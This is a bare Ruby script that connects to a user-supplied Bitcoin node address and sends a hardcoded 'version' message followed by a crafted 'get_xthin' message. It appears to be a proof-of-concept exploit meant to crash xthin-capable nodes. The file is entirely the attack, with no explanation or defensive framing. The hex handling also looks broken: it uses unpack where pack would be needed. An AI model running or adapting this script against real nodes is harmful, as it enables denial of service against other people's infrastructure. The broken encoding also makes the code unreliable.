require 'socket'
require 'time'

arguments = ARGV
BUFFER_SIZE = 1024
VERSION = "f9beb4d976657273696f6e00000000006600000023c22f307e110100000000000000000040dbc75800000000000000000000000000000000000000000000ffffad61bfae208d000000000000000000000000000000000000ffff0000000000002747310f6a3c90b9102f5361746f7368693a302e31332e312fbff9060000".unpack('H*')
GET_XTHIN = "f9beb4d96765745f787468696e00000050000000738a98c80200000000000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000000000120000000000000001".unpack('H*')

if arguments.length > 2 then
  TCP_PORT = arguments[2].to_i
  TCP_IP = arguments[1]
elsif arguments.length > 1 then
  TCP_PORT = 8333
  TCP_IP = arguments[1]
else
  puts("Usage: #{arguments[0]} [IP ADDRESS] [PORT]")
  exit
end

socket = TCPSocket.open(TCP_IP, TCP_PORT)
socket.print(VERSION)

response = socket.recv(BUFFER_SIZE)
sleep(1)

socket.print(GET_XTHIN)
sleep(1)
socket.close()
